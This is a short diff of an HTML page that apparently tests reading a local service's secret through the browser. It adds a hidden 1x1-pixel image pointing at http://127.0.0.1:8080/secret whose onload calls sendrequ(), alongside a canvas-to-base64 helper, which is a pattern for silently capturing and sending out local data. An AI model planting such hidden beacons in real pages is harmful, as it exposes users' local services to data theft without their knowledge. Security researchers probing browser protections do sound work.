@@ -6,8 +6,8 @@
     
   </head>
   <body>
-  <img id="ttt" src="http://127.0.0.1:8080/secret" style="width:1px;height:1px;">
-  <iframe src="http://127.0.0.1:8080/secret"></iframe> 
+  
+  <!--<iframe src="http://127.0.0.1:8080/secret"></iframe> -->
     <script>
 function getBase64Image(img) {
     // Create an empty canvas element
@@ -49,6 +49,7 @@ function sendrequ(){
 	}
 	*/
     </script>
+    <img id="ttt" src="http://127.0.0.1:8080/secret" style="width:1px;height:1px;" onload="sendrequ();">
   </body>
 </html> 
  
